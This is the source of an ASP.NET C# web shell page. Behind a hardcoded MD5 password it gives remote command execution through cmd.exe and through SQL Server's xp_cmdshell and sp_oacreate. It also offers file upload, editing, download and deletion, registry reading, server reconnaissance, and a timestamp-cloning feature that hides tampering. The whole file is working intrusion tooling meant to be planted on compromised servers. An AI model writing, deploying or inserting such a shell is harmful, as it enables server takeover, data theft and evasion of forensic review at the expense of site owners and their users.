<%@ Page Language="C#" AutoEventWireup="true" validateRequest="false" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.OleDb" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<script runat="server" >
    const string PASSWORD = "e99ffc41e7a31b51a64379b1375110ad"; // Here, modify the default password to yours, MD5 Hash.
    
    const string SESSION_ON = "WebAminCS2";                     // Session name, avoid session crash. you can change it to any string.
    static DataSet myDataSet;
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Session["SESSION_ON"] == null)
            {
                ShowLogin();
            }
            else
            {
                ShowMainHead();
                if (!Page.IsPostBack)
                {
                    switch (Request["action"].ToString())
                    {
                        case "goto":
                            txB_CurrentDir.Text = Request["src"].ToString();
                            ShowFolders(txB_CurrentDir.Text);
                            break;
                        case "copy":
                            ShowCopy(Request["src"]);
                            break;
                        case "cut":
                            ShowCut(Request["src"]);
                            break;
                        case "down":
                            DownLoadIt(Request["src"]);
                            break;
                        case "edit":
                            ShowEdit(Request["src"]);
                            break;
                        case "del":
                            ShowDel(Request["src"]);
                            break;
                        case "rename":
                            ShowRn(Request["src"]);
                            break;
                        case "att":
                            ShowAtt(Request["src"]);
                            break;
                        default:
                            break;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_Login_Click(object sender, EventArgs e)
    {
        string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(txB_Password.Text, "MD5").ToLower();
        if (MD5Pass == PASSWORD)
        {
            Session["SESSION_ON"] = 1;
            ShowMainHead();
        }
        else
        {
            lbl_Tip.Text = "<b>Login failed for password error!</b>";
        }
    }
    protected void btn_FileManager_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = true;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
        if (string.IsNullOrEmpty(txB_CurrentDir.Text) || txB_CurrentDir.Text.Trim().Length == 0)
        {
            txB_CurrentDir.Text = Server.MapPath("./");
        }
        ShowFolders(txB_CurrentDir.Text);
    }
    protected void btn_Cmd_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = true;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;

        txB_CmdPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
    }
    protected void btn_CloneTime_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = true;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
    }
    protected void btn_SQLRootkit_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = true;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
    }
    protected void btn_SysInfo_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = true;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
        lbl_ServerIP.Text = Request.ServerVariables["LOCAL_ADDR"];
        lbl_MachineName.Text = Environment.MachineName;
        lbl_NetworkName.Text = Environment.UserDomainName.ToString();
        lbl_UserName.Text = Environment.UserName;
        lbl_OSver.Text = Environment.OSVersion.ToString();
        lbl_StartTime.Text = Environment.TickCount / 1000 + " Seconds";
        lbl_SysTime.Text = DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString();
        lbl_IISVer.Text = Request.ServerVariables["SERVER_SOFTWARE"];
        lbl_HTTPS.Text = Request.ServerVariables["HTTPS"];
        lbl_RelPath.Text = Request.ServerVariables["PATH_INFO"];
        lbl_AbsPath.Text = Request.ServerVariables["PATH_TRANSLATED"];
        lbl_SerPort.Text = Request.ServerVariables["SERVER_PORT"];
        lbl_SID.Text = Session.SessionID;
    }
    protected void btn_DBA_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = true;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
    }
    protected void btn_Regedit_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = true;
        pnl_About.Visible = false;
    }
    protected void btn_About_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_DBA.Visible = false;
        pnl_About.Visible = true;
    }
    protected void btn_Exit_Click(object sender, EventArgs e)
    {
        Session.Abandon();
        lbl_Tip.Text = "<b>See you next time!</b>";
        ShowLogin();
    }
    protected void btn_ListDir_Click(object sender, EventArgs e)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
        pnl_FileManager.Visible = true;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_DBA.Visible = false;
        pnl_About.Visible = false;
        ShowFolders(txB_CurrentDir.Text);
    }
    protected void btn_Plaste_Click(object sender, EventArgs e)
    {
        try
        {
            string srcPath = Session["Source"].ToString();
            string desDir;
            if (txB_CurrentDir.Text.Substring(txB_CurrentDir.Text.Length - 1) != "\\")
            {
                desDir = txB_CurrentDir.Text + "\\";
            }
            else
            {
                desDir = txB_CurrentDir.Text;
            }
            if (Session["FileAct"].ToString() == "Copy")
            {
                if (srcPath.Substring(srcPath.Length - 1) == "\\")
                {
                    if (srcPath != desDir)
                    {
                        string desPath = (desDir == Directory.GetParent(srcPath.Substring(0, srcPath.Length - 1)).ToString() + "\\") ? (desDir + "复件 " + Path.GetFileName(srcPath.Substring(0, srcPath.Length - 1))) : (desDir + Path.GetFileName(srcPath.Substring(0, srcPath.Length - 1)));
                        Directory.CreateDirectory(desPath + "\\");
                        Copydir(srcPath, desPath + "\\");
                    }
                }
                else
                {
                    string desPath = (desDir == Directory.GetParent(srcPath).ToString() + "\\") ? (desDir + "复件 " + Path.GetFileName(srcPath)) : (desDir + Path.GetFileName(srcPath));
                    File.Copy(srcPath, desPath);
                }
                ShowFolders(txB_CurrentDir.Text);
                Response.Write("<script type='text/javascript'>alert('Copy success!');</"+"script>");
            }
            else if (Session["FileAct"].ToString() == "Cut")
            {
                if (srcPath.Substring(srcPath.Length - 1) == "\\")
                {
                    if (srcPath != desDir && desDir != Directory.GetParent(srcPath.Substring(0, srcPath.Length - 1)).ToString() + "\\")
                    {
                        Directory.Move(srcPath, desDir + Path.GetFileName(srcPath.Substring(0, srcPath.Length - 1)) + "\\");
                    }
                }
                else
                {
                    if (desDir != Directory.GetParent(srcPath).ToString() + "\\")
                    {
                        File.Move(srcPath, desDir + Path.GetFileName(srcPath));
                    }
                }
                Response.Write("<script type='text/javascript'>alert('Cut success!');</"+"script>");
                ShowFolders(txB_CurrentDir.Text);
            }
            else
            {
                Response.Write("<script type='text/javascript'>alert('Plaste Fail!');</"+"script>");
            }
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_NewFile_Click(object sender, EventArgs e)
    {
        try
        {
            string desDir;
            if (txB_CurrentDir.Text.Substring(txB_CurrentDir.Text.Length - 1) != "\\")
            {
                desDir = txB_CurrentDir.Text + "\\";
            }
            else
            {
                desDir = txB_CurrentDir.Text;
            }
            StreamWriter myStreamWriter = new StreamWriter(desDir + txB_NewCreate.Text, true, Encoding.Default);
            myStreamWriter.Close();
            lbl_Tip.Text = "Create File Success !";
            ShowFolders(txB_CurrentDir.Text);
            txB_NewCreate.Text = "";
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_NewDir_Click(object sender, EventArgs e)
    {
        try
        {
            string desDir;
            if (txB_CurrentDir.Text.Substring(txB_CurrentDir.Text.Length - 1) != "\\")
            {
                desDir = txB_CurrentDir.Text + "\\";
            }
            else
            {
                desDir = txB_CurrentDir.Text;
            }
            Directory.CreateDirectory(desDir + txB_NewCreate.Text);
            lbl_Tip.Text = "Create Folder Success !";
            ShowFolders(txB_CurrentDir.Text);
            txB_NewCreate.Text = "";
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_UpFile_Click(object sender, EventArgs e)
    {
        try
        {
            string desDir;
            if (txB_CurrentDir.Text.Substring(txB_CurrentDir.Text.Length - 1) != "\\")
            {
                desDir = txB_CurrentDir.Text + "\\";
            }
            else
            {
                desDir = txB_CurrentDir.Text;
            }
            string filename, loadpath;
            filename = Path.GetFileName(input_FilePath.Value);
            loadpath = desDir + filename;
            input_FilePath.PostedFile.SaveAs(loadpath);
            lbl_Tip.Text = "Upload File Success !";
            ShowFolders(txB_CurrentDir.Text);
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_CmdRun_Click(object sender, EventArgs e)
    {
        try
        {
            Process myProcess = new Process();
            ProcessStartInfo myProcessStartInfo = new ProcessStartInfo(txB_CmdPath.Text);
            myProcessStartInfo.UseShellExecute = false;
            myProcessStartInfo.RedirectStandardOutput = true;
            myProcess.StartInfo = myProcessStartInfo;
            myProcessStartInfo.Arguments = txB_CmdArgs.Text;
            myProcess.Start();
            StreamReader myStreamReader = myProcess.StandardOutput;
            string strCmdRes = myStreamReader.ReadToEnd(); ;
            myProcess.Close();
            strCmdRes = strCmdRes.Replace("<", "&lt;");
            strCmdRes = strCmdRes.Replace(">", "&gt;");
            lbl_CmdResult.Text = "<pre>" + strCmdRes + "</pre>";
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_CloneT_Click(object sender, EventArgs e)
    {
        try
        {
            FileInfo thisfile = new FileInfo(txB_File1Time.Text);
            FileInfo thatfile = new FileInfo(txB_File2Time.Text);
            thisfile.LastWriteTime = thatfile.LastWriteTime;
            thisfile.LastAccessTime = thatfile.LastAccessTime;
            thisfile.CreationTime = thatfile.CreationTime;
            lbl_CloneResult.Text = "<font color=\"red\">Clone Time Success!</font>";
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_SQLCmdRun_Click(object sender, EventArgs e)
    {
        try
        {
            if (!string.IsNullOrEmpty(txB_ConnStr.Text) && txB_ConnStr.Text.Trim().Length > 0 && !string.IsNullOrEmpty(txB_SQLCmd.Text) && txB_SQLCmd.Text.Trim().Length > 0)
            {
                string strResult = "";
                SqlConnection mySqlConn = new SqlConnection(txB_ConnStr.Text.Trim());
                string strQuery = "xp_cmdshell '" + txB_SQLCmd.Text.Trim() + "'";
                SqlCommand mySqlCmd = new SqlCommand(strQuery, mySqlConn);
                try
                {
                    mySqlConn.Open();
                }
                catch (Exception ex)
                {
                    lbl_SQLResult.Text = "<pre>" + ex.Message + "</pre>";
                    return;
                }
                try
                {
                    SqlDataReader mySqlDr = mySqlCmd.ExecuteReader();
                    while (mySqlDr.Read())
                    {
                        strResult += mySqlDr[0].ToString() + "\n";
                    }
                    mySqlDr.Close();
                }
                catch (Exception ex)
                {
                    strResult += ex.Message + "\n";
                    string strQuery2 = "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'" + Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe /c" + txB_SQLCmd.Text.Trim() + "'";
                    mySqlCmd = new SqlCommand(strQuery2, mySqlConn);
                    try
                    {
                        SqlDataReader mySqlDr = mySqlCmd.ExecuteReader();
                        while (mySqlDr.Read())
                        {
                            strResult += mySqlDr[0].ToString() + "\n";
                        }
                        mySqlDr.Close();
                    }
                    catch (Exception exp)
                    {
                        strResult += exp.Message + "\n";
                    }
                }
                finally
                {
                    mySqlConn.Close();
                    strResult = strResult.Replace("<", "&lt;");
                    strResult = strResult.Replace(">", "&gt;");
                    lbl_SQLResult.Text = "<pre>" + strResult + "</pre>";
                }
            }
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void btn_DBSubmit_Click(object sender, EventArgs e)
    {
        if (string.IsNullOrEmpty(txB_DBConnStr.Text) || txB_DBConnStr.Text.Trim().Length == 0)
        {
            ShowError("The connection string for database can't be blank");
            return;
        }
        else
        {
            try
            {
                lbl_DBExecRes.Text = "";
                gView_DB.DataSource = null;
                gView_DB.DataBind();
                string strTmp = "<br /><b>The Tables :</b><br />";
                OleDbConnection myConn = new OleDbConnection(txB_DBConnStr.Text.Trim());
                DataTable db_schemaTable = new DataTable();
                myConn.Open();
                db_schemaTable = myConn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, new object[] { null, null, null, "TABLE" });
                for (int i = 0; i < db_schemaTable.Rows.Count; i++)
                {
                    strTmp += db_schemaTable.Rows[i]["TABLE_NAME"].ToString() + "<br />";
                }
                lbl_DBShowTable.Text = strTmp;
                myConn.Close();
                lbl_DBExec.Visible = true;
                txB_DBExecStr.Visible = true;
                btn_DBExec.Visible = true;
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }
    }
    protected void btn_DBExec_Click(object sender, EventArgs e)
    {
        if (string.IsNullOrEmpty(txB_DBConnStr.Text) || txB_DBConnStr.Text.Trim().Length == 0)
        {
            ShowError("The connection string for database can't be blank");
            return;
        }
        if (string.IsNullOrEmpty(txB_DBExecStr.Text) || txB_DBExecStr.Text.Trim().Length == 0)
        {
            ShowError("The query string for database can't be blank");
            return;
        }
        lbl_DBExecRes.Text = "";
        gView_DB.DataSource = null;
        gView_DB.DataBind();
        OleDbConnection myConn = new OleDbConnection(txB_DBConnStr.Text.Trim());
        string strSql = txB_DBExecStr.Text.Trim();
        strSql = strSql.Replace(";", " ");
        string[] str_SQLs = strSql.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        OleDbConnection myRealConn;
        if (str_SQLs[0].ToLower() == "use")
        {
            string strTmp = txB_DBConnStr.Text.Trim();
            strTmp = strTmp.Substring(0, strTmp.IndexOf("Initial Catalog")) + "Initial Catalog=" + str_SQLs[1] + strTmp.Substring(strTmp.IndexOf(";User Id"));
            myRealConn = new OleDbConnection(strTmp);
            strSql = strSql.Substring(strSql.IndexOf(str_SQLs[2]));
        }
        else
        {
            myRealConn = myConn;
        }
        if (myRealConn != null && myRealConn.State != ConnectionState.Open)
        {
            myRealConn.Open();
        }
        string strSql_U = strSql.ToUpper();
        if (strSql_U.IndexOf("SELECT ") == 0 || strSql_U.IndexOf("(SELECT ") == 0 || strSql_U.Contains(" SELECT ") || strSql_U.Contains("'SELECT "))
        {
            try
            {
                OleDbDataAdapter myOleDbDataAdapter = new OleDbDataAdapter(strSql, myRealConn);
                myDataSet = new DataSet();
                myOleDbDataAdapter.Fill(myDataSet, "tb_Temp");
                gView_DB.DataSource = myDataSet.Tables["tb_Temp"].DefaultView;
                gView_DB.DataBind();
            }
            catch (Exception ex)
            {
                lbl_DBExecRes.Text = "<pre>" + ex.Message + "</pre>";
            }
            finally
            {
                myRealConn.Close();
            }
        }
        else
        {
            strSql_U = (strSql_U[0] == '(') ? strSql_U.Substring(1).Trim() : strSql_U;
            if (strSql_U.IndexOf("EXEC ") == 0 || strSql_U.IndexOf("EXEC(") == 0 || strSql_U.Contains(" EXEC SP_") || strSql_U.Contains(" EXEC XP_"))
            {
                string str_Res = "";
                try
                {
                    OleDbCommand myCmd = new OleDbCommand(strSql, myRealConn);
                    OleDbDataReader myDr = myCmd.ExecuteReader();
                    while (myDr.Read())
                    {
                        str_Res += myDr[0].ToString() + "\n";
                    }
                    myDr.Close();
                }
                catch (Exception ex)
                {
                    str_Res = ex.Message;
                }
                finally
                {
                    str_Res = str_Res.Replace("<", "&lt;");
                    str_Res = str_Res.Replace(">", "&gt;");
                    lbl_DBExecRes.Text = "<pre>" + str_Res + "</pre>";
                    myRealConn.Close();
                }
            }
            else
            {
                int Ret_Num;
                try
                {
                    OleDbCommand myCmd = new OleDbCommand(strSql, myRealConn);
                    Ret_Num = myCmd.ExecuteNonQuery();
                    if (Ret_Num > 0)
                    {
                        lbl_DBExecRes.Text = "(" + Ret_Num.ToString() + " row(s) affected)";
                    }
                    else if (Ret_Num == 0)
                    {
                        lbl_DBExecRes.Text = "The command completed successfully";
                    }
                    else if (Ret_Num == -1)
                    {
                        lbl_DBExecRes.Text = "UPDATE|INSERT|DELETE,etc may be failed; DROP|CREATE|ALTER, etc may be completed successfully!";
                    }
                    else
                    {
                        lbl_DBExecRes.Text = "The command completed";
                    }
                }
                catch (Exception ex)
                {
                    lbl_DBExecRes.Text = "<pre>" + ex.Message + "</pre>";
                }
                finally
                {
                    myRealConn.Close();
                }
            }
        }
    }
    protected void btn_ReadReg_Click(object sender, EventArgs e)
    {
        try
        {
            string fullKeyName = txB_RegKey.Text.Trim();
            RegistryKey rk = null;
            switch (fullKeyName.Substring(0, fullKeyName.IndexOf("\\")))
            {
                case "HKEY_LOCAL_MACHINE":
                    rk = Registry.LocalMachine.OpenSubKey(fullKeyName.Substring(fullKeyName.IndexOf("\\") + 1, fullKeyName.LastIndexOf("\\") - fullKeyName.IndexOf("\\") - 1));
                    break;
                case "HKEY_CLASSES_ROOT":
                    rk = Registry.ClassesRoot.OpenSubKey(fullKeyName.Substring(fullKeyName.IndexOf("\\") + 1, fullKeyName.LastIndexOf("\\") - fullKeyName.IndexOf("\\") - 1));
                    break;
                case "HKEY_CURRENT_USER":
                    rk = Registry.CurrentUser.OpenSubKey(fullKeyName.Substring(fullKeyName.IndexOf("\\") + 1, fullKeyName.LastIndexOf("\\") - fullKeyName.IndexOf("\\") - 1));
                    break;
                case "HKEY_USERS":
                    rk = Registry.Users.OpenSubKey(fullKeyName.Substring(fullKeyName.IndexOf("\\") + 1, fullKeyName.LastIndexOf("\\") - fullKeyName.IndexOf("\\") - 1));
                    break;
                case "HKEY_CURRENT_CONFIG":
                    rk = Registry.CurrentConfig.OpenSubKey(fullKeyName.Substring(fullKeyName.IndexOf("\\") + 1, fullKeyName.LastIndexOf("\\") - fullKeyName.IndexOf("\\") - 1));
                    break;
                default:
                    break;
            }
            txB_RegValue.Text = rk.GetValue(fullKeyName.Substring(fullKeyName.LastIndexOf("\\") + 1), "NULL").ToString();
            rk.Close();
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void ShowLogin()
    {
        pnl_Login.Visible = true;
        pnl_MainBar.Visible = false;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_DBA.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_About.Visible = false;
    }
    protected void ShowMainHead()
    {
        lbl_Tip.Text = "Welcome !——Have a good harvest !";
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = true;
    }
    protected void ShowError(string ErrorMsg)
    {
        lbl_Tip.Text = "<font color='red'><b>Wrong: </b></font>" + ErrorMsg;
    }
    protected void ShowDrives()
    {
        lbl_Drives.Text = "Go To : ";
        lbl_Drives.Text += "<a href=\"?action=goto&src=" + Server.UrlEncode(Server.MapPath("./")) + "\"> ./ </a> ";
        lbl_Drives.Text += "<a href=\"?action=goto&src=" + Server.UrlEncode(Server.MapPath("~")) + "\"> ~ </a> ";
        lbl_Drives.Text += "<a href=\"?action=goto&src=" + Server.UrlEncode(Server.MapPath("/")) + "\"> wwwroot</a> ";
        for (int i = 0; i < Directory.GetLogicalDrives().Length; i++)
        {
            lbl_Drives.Text += "<a href=\"?action=goto&src=" + Directory.GetLogicalDrives()[i] + "\">" + Directory.GetLogicalDrives()[i] + " </a>";
        }
    }
    protected void ShowFolders(string strFPath)
    {
        try
        {
            ShowDrives();
            if (strFPath[strFPath.Length - 1] != '\\')
            {
                strFPath += "\\";
            }
            DirectoryInfo mydir = new DirectoryInfo(strFPath);
            lbl_Files.Text = "<table width=\"90%\" border=\"0\" align=\"center\">";
            lbl_Files.Text += "<tr><td width=\"40%\"><b>Name</b></td><td width=\"15%\"><b>Size</b></td>";
            lbl_Files.Text += "<td width=\"20%\"><b>ModifyTime</b></td><td width=\"25%\"><b>Operate</b></td></tr>";
            lbl_Files.Text += "<tr><td><tr><td><a href='?action=goto&src=";
            string strParentDir;
            if (strFPath.Length < 4)
            {
                strParentDir = Server.UrlEncode(strFPath);
            }
            else
            {
                strParentDir = Server.UrlEncode(Directory.GetParent(strFPath.Substring(0, strFPath.Length - 1)).ToString());
            }
            lbl_Files.Text += strParentDir + "'><i>|Parent Directory|</i></a></td></tr>";
            foreach (DirectoryInfo xdir in mydir.GetDirectories())
            {
                lbl_Files.Text += "<tr><td>";
                string dirPath = Server.UrlEncode(strFPath + xdir.Name + "\\");
                lbl_Files.Text += "<a href='?action=goto&src=" + dirPath + "'>" + xdir.Name + "</a></td>";
                lbl_Files.Text += "<td>&lt;dir&gt;</td>";
                lbl_Files.Text += "<td>" + Directory.GetLastWriteTime(strFPath + "\\" + xdir.Name) + "</td>";
                lbl_Files.Text += "<td><a href='?action=cut&src=" + dirPath + "' target='_blank'>Cut" + "</a>|";
                lbl_Files.Text += "<a href='?action=copy&src=" + dirPath + "' target='_blank'>Copy</a>|";
                lbl_Files.Text += "<a href='?action=rename&src=" + dirPath + "' target='_blank'>Ren</a>|";
                lbl_Files.Text += "<a href='?action=att&src=" + dirPath + "'" + "' target=_blank'>Att</a>|";
                lbl_Files.Text += "<a href='?action=del&src=" + dirPath + "'" + "' target=_blank'>Del</a></td>";
                lbl_Files.Text += "</tr>";
            }
            lbl_Files.Text += "</td></tr><tr><td>";
            foreach (FileInfo xfile in mydir.GetFiles())
            {
                string filePath;
                filePath = Server.UrlEncode(strFPath + xfile.Name);
                lbl_Files.Text += "<tr><td>" + xfile.Name + "</td>";
                lbl_Files.Text += "<td>" + xfile.Length.ToString() + " Byte" + "</td>";
                lbl_Files.Text += "<td>" + File.GetLastWriteTime(strFPath + xfile.Name) + "</td>";
                lbl_Files.Text += "<td><a href='?action=edit&src=" + filePath + "' target='_blank'>Edit</a>|";
                lbl_Files.Text += "<a href='?action=cut&src=" + filePath + "' target='_blank'>Cut</a>|";
                lbl_Files.Text += "<a href='?action=copy&src=" + filePath + "' target='_blank'>Copy</a>|";
                lbl_Files.Text += "<a href='?action=rename&src=" + filePath + "' target='_blank'>Ren</a>|";
                lbl_Files.Text += "<a href='?action=down&src=" + filePath + "'>Down</a>|";
                lbl_Files.Text += "<a href='?action=att&src=" + filePath + "' target=_blank'>Att</a>|";
                lbl_Files.Text += "<a href='?action=del&src=" + filePath + "' target=_blank'>Del</a></td>";
                lbl_Files.Text += "</tr>";
            }
            lbl_Files.Text += "</table>";
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void ShowEdit(string filepath)
    {
        pnl_Login.Visible = false;
        pnl_MainBar.Visible = false;
        pnl_FileManager.Visible = false;
        pnl_Cmd.Visible = false;
        pnl_CloneTime.Visible = false;
        pnl_SQLRootkit.Visible = false;
        pnl_SysInfo.Visible = false;
        pnl_Regedit.Visible = false;
        pnl_DBA.Visible = false;
        pnl_About.Visible = false;

        pnl_FileEdit.Visible = true;
        txB_FileEdit.Text = filepath;
        StreamReader mySR = new StreamReader(filepath, Encoding.Default);
        txB_FileContent.Text = mySR.ReadToEnd();
        mySR.Close();
    }
    protected void ShowDel(string strpath)
    {
        pnl_MainBar.Visible = false;
        pnl_FileManager.Visible = false;

        pnl_FileDirDel.Visible = true;
        lbl_FileDirDel.Text = "Are you sure to delete the file/folder <b>" + strpath + "</b> ?";
    }
    protected void ShowRn(string strPath)
    {
        pnl_MainBar.Visible = false;
        pnl_FileManager.Visible = false;

        pnl_FileDirRename.Visible = true;
        if (strPath[strPath.Length - 1] != '\\')
        {
            txB_FileDirRen.Text = Path.GetFileName(strPath);
        }
        else
        {
            strPath = strPath.Substring(0, strPath.Length - 1);
            txB_FileDirRen.Text = strPath.Substring(strPath.LastIndexOf("\\") + 1);
        }
    }
    protected void DownLoadIt(string strPath)
    {
        try
        {
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment;filename=" + Server.UrlEncode(Path.GetFileName(strPath)));
            Response.TransmitFile(strPath);
            Response.End();
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void ShowAtt(string strPath)
    {
        pnl_MainBar.Visible = false;
        pnl_FileManager.Visible = false;

        pnl_FileDirAtt.Visible = true;
        if ((File.GetAttributes(strPath) & FileAttributes.Hidden) == FileAttributes.Hidden)
        {
            chkB_Hide.Checked = true;
        }
        if ((File.GetAttributes(strPath) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
        {
            chkB_OnlyRead.Checked = true;
        }
        if ((File.GetAttributes(strPath) & FileAttributes.System) == FileAttributes.System)
        {
            chkB_Sys.Checked = true;
        }
        if ((File.GetAttributes(strPath) & FileAttributes.Archive) == FileAttributes.Archive)
        {
            chkB_Archive.Checked = true;
        }
    }
    protected void ShowCopy(string strPath)
    {
        Session["FileAct"] = "Copy";
        Session["Source"] = strPath;
        if (strPath[strPath.Length - 1] != '\\')
        {
            Response.Write("<script type='text/javascript'>alert('File info have add to the cutboard, go to target directory click plaste!')</"+"script>");
        }
        else
        {
            Response.Write("<script type='text/javascript'>alert('Folder info have add to the cutboard, go to target directory click plaste!')</"+"script>");
        }
        Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
    }
    protected void ShowCut(string strPath)
    {
        Session["FileAct"] = "Cut";
        Session["Source"] = strPath;
        if (strPath[strPath.Length - 1] != '\\')
        {
            Response.Write("<script type='text/javascript'>alert('File info have add to the cutboard, go to target directory click plaste!')</"+"script>");
        }
        else
        {
            Response.Write("<script type='text/javascript'>alert('Directory info have add to the cutboard, go to target directory click plaste!')</"+"script>");
        }
        Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
    }
    protected void Copydir(string a, string b)
    {
        DirectoryInfo mydir = new DirectoryInfo(a);
        foreach (FileInfo xfile in mydir.GetFiles())
        {
            File.Copy(a + xfile.Name, b + xfile.Name);
        }
        foreach (DirectoryInfo xdir in mydir.GetDirectories())
        {
            Directory.CreateDirectory(b + Path.GetFileName(a + xdir.Name));
            Copydir(a + xdir.Name + "\\", b + xdir.Name + "\\");
        }
    }
    protected void DelDirFile(string strPath)
    {
        if (strPath[strPath.Length - 1] == '\\')
        {
            DirectoryInfo myDir = new DirectoryInfo(strPath);
            foreach (FileInfo xfile in myDir.GetFiles())
            {
                File.Delete(strPath + xfile.Name);
            }
            foreach (DirectoryInfo xdir in myDir.GetDirectories())
            {
                DelDirFile(strPath + xdir.Name + "\\");
            }
            Directory.Delete(strPath);
        }
        else
        {
            File.Delete(strPath);
        }
        Response.Write("<script type='text/javascript'>alert('Delete " + strPath.Replace("\\", "\\\\") + " Success! Please refresh')</"+"script>");
        Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
    }
    protected void rbtn_SQL_Y(object sender, EventArgs E)
    {
        rbtn_TypeSQL.Checked = true;
        rbtn_TypeAcc.Checked = false;
        txB_DBConnStr.Text = "Provider=SQLOLEDB;Data Source=(local);Initial Catalog=master;User Id=sa;Password=";
    }
    protected void rbtn_Acc_Y(object sender, EventArgs E)
    {
        rbtn_TypeSQL.Checked = false;
        rbtn_TypeAcc.Checked = true;
        txB_DBConnStr.Text = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\WebSite\\bbs.mdb";
    }
    protected void btn_FileEdit_Click(object sender, EventArgs e)
    {
        try
        {
            StreamWriter mySW = new StreamWriter(txB_FileEdit.Text, false, Encoding.Default);
            mySW.Write(txB_FileContent.Text);
            mySW.Close();
            Response.Write("<script type='text/javascript'>alert('Edit " + txB_FileEdit.Text.Replace("\\", "\\\\") + " Success! Please refresh')</"+"script>");
            Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
